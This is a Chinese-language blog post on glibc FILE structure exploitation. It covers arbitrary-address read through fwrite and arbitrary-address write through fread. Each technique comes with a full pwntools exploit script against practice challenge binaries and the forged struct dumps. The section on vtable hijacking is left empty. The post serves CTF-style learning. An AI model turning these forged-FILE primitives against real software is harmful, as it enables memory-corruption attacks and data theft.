---
layout: post
tags: [pwn]
title: "File Struct 利用手法"
author: wsxk
date: 2025-4-21
comments: true
---

- [1. 任意地址读](#1-任意地址读)
- [2. 任意地址写](#2-任意地址写)
- [3. 劫持vtable](#3-劫持vtable)


# 1. 任意地址读<br>
前提条件:**能够控制file_struct结构体,且能调用fwrite函数**<br>
```python
from pwn import *
context.log_level='debug'
context.os='linux'
context.arch='amd64'

binary_path = "./babyfile_level1"
binary_path = "/challenge/babyfile_level1"
p = process(binary_path)
p.recvuntil(b"The flag has been read into memory and is located at ")
secret = int(p.recvline().strip(b"\n"),16)
log.success(f"secret: {hex(secret)}")

#利用部分，可以借助pwntools工具的强大库函数帮助我们生成想要的结构体，十分方便
file = FileStructure()
payload = file.write(secret,0x30)  
print(file)
"""
{ flags: 0x800
 _IO_read_ptr: 0x0
 _IO_read_end: 0x4040e0
 _IO_read_base: 0x0
 _IO_write_base: 0x4040e0
 _IO_write_ptr: 0x404110
 _IO_write_end: 0x0
 _IO_buf_base: 0x0
 _IO_buf_end: 0x0
 _IO_save_base: 0x0
 _IO_backup_base: 0x0
 _IO_save_end: 0x0
 markers: 0x0
 chain: 0x0
 fileno: 0x1
 _flags2: 0x0
 _old_offset: 0xffffffffffffffff
 _cur_column: 0x0
 _vtable_offset: 0x0
 _shortbuf: 0x0
 unknown1: 0x0
 _lock: 0x0
 _offset: 0xffffffffffffffff
 _codecvt: 0x0
 _wide_data: 0x0
 unknown2: 0x0
 vtable: 0x0
"""
p.send(payload)
p.interactive()
```

# 2. 任意地址写<br>
前提条件:**能够控制file_struct结构体,且能调用fread函数**<br>
```python
from pwn import *
context.log_level='debug'
context.os='linux'
context.arch='amd64'
context.terminal = ["tmux","splitw","-h"]

binary_path = "./babyfile_level2"
#binary_path = "/challenge/babyfile_level2"

p = process(binary_path)
p.recvuntil(b"Now reading from stdin directly to the FILE struct.\n")
#gdb.attach(p,"b *0x401A61")
#pause()

# file struct construction
file = FileStructure()
payload = file.read(0x4041F8,0x101) # 注意，read设置的buffer_size，必须大于fread读取的字节数；我猜测这么做的原因是，如果file_buf太小，就没必要拷贝到file_buf中了，直接拷贝到目标buffere中即可
print(file)
"""
{ flags: 0x0
 _IO_read_ptr: 0x0
 _IO_read_end: 0x0
 _IO_read_base: 0x0
 _IO_write_base: 0x0
 _IO_write_ptr: 0x0
 _IO_write_end: 0x0
 _IO_buf_base: 0x4041f8
 _IO_buf_end: 0x4041fc
 _IO_save_base: 0x0
 _IO_backup_base: 0x0
 _IO_save_end: 0x0
 markers: 0x0
 chain: 0x0
 fileno: 0x0
 _flags2: 0x0
 _old_offset: 0xffffffffffffffff
 _cur_column: 0x0
 _vtable_offset: 0x0
 _shortbuf: 0x0
 unknown1: 0x0
 _lock: 0x0
 _offset: 0xffffffffffffffff
 _codecvt: 0x0
 _wide_data: 0x0
 unknown2: 0x0
 vtable: 0x0}
"""
print(payload)
p.send(payload)

p.recvuntil(b"Here is the contents of the FILE structure.")
p.send(b"a"*0x100)
p.interactive()
```
# 3. 劫持vtable<br>









<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>

